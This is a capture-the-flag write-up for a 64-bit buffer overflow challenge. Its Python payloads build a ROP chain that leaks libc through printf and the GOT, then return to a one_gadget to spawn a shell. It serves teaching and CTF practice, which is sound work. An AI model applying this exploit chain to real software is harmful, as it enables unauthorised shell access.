## Stop, ROP, n', Roll
**Category:** pwn  
**Points:** 280

## Writeup
Another ROP, this time on 64 bit. We don't have any quirky functions that spawn a shell or anything, so we'll have to do it ourselves.  
Our final goal is to call a [one_gadget](https://github.com/david942j/one_gadget), which is literally ```execve("/bin/sh")```, giving us a shell.  
Since ASLR is enabled, though, we need to leak libc first.

This is the entire plan:
1. Leak libc and calculate one_gadget
2. Spawn a shell
# Libc leak
To leak libc, we need to pass a libc function's GOT address into ```printf```. On 64 machines, this means loading the ```rdi``` register with a libc function's GOT. Conveniently, there's a gadget that pops rdi and returns at ```0x400823```, so we'll use that.  
We'll also return back to ```main`` after we call leak libc, since we need to send a second payload that actually spawns the shell.
This is the payload in python (also can be found in the file):
```
payload = 'a'*17  			#  padding
payload += p64(pop_rdi)			#  pop the argument to printf, aka the next element on the stack is printf's arg
payload += p64(e.got["read"])		#  printf's argument is read's GOT. we're leaking read's resolved address.
payload += p64(ret)			#  random ret here for padding (not adding this caused segfaults for some reason?) this still returns into printf, so it's fine
payload += p64(e.plt["printf"])		#  printf call that leaks read's address
payload += p64(ret)			#  another ret for padding
payload += p64(main)			#  return back to main. this payload for leaking libc, the next one will spawn a shell since we can calculate one_gadget.
```
# Shell spawning
The easy part. Pretty self-explanatory, just overwrite ```main```'s return to the ```one_gadget```.
```
payload = 'a'*17			#  padding
payload += p64(og)			#  calculated address of one_gadget
```
